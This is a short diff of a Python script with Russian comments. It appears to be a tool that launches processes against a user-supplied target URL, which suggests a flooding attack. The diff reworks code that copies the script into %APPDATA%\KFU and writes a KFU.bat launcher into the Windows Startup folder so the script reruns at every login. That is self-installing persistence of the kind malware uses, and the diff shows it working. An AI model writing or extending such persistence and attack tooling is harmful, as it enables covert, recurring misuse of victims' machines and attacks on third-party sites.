@@ -46,14 +46,14 @@ def start_processes(target_url, process_count, thread_count):
 def create_bat_in_startup():
     # Определяем путь к папке автозагрузки
     startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-
-    # Создаем BAT файл непосредственно в папке автозагрузки
     bat_filename = 'KFU.bat'
     bat_dest_path = os.path.join(startup_path, bat_filename)
+    destination_folder = os.path.join(os.getenv('APPDATA'), 'KFU')
+    script_path = os.path.join(destination_folder, os.path.basename(__file__))
     bat_content = """@echo off
-    cd /d %~dp0
+    cd /d "{}"
     python "{}"
-    """.format(os.path.abspath(__file__))
+    """.format(destination_folder, script_path)
 
     # Проверяем, есть ли уже bat файл в папке автозагрузки
     if not os.path.exists(bat_dest_path):
@@ -67,7 +67,7 @@ if __name__ == "__main__":
     # Копируем папку в другое место
     copy_folder_to_destination()
 
-    # Создаем BAT файл
+    # Создаем BAT файл в папке автозагрузки
     create_bat_in_startup()
 
     url = input("Введите URL: ")
